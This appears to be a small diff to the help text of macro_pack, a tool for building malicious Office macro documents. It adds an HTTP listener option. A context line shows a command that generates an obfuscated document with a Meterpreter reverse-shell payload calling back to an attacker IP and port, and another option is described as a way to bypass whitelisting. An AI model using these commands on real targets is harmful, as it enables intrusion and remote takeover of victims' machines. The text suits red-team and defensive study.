@@ -215,7 +215,9 @@ echo 192.168.0.5 4444 | macro_pack.exe -t METERPRETER -o -G "\\192.168.0.8\c$\us
     --run=FILE_PATH Open document using COM to run macro. Can be useful to bypass whitelisting situations.
        This will trigger AutoOpen/Workbook_Open automatically. 
        If no auto start function, use --start-function option to indicate which macro to run. 
-         
+    
+    -l, --listen=PORT Open an HTTP server listening on defined port.
+       
     -h, --help   Displays help and exit
     
   Notes:
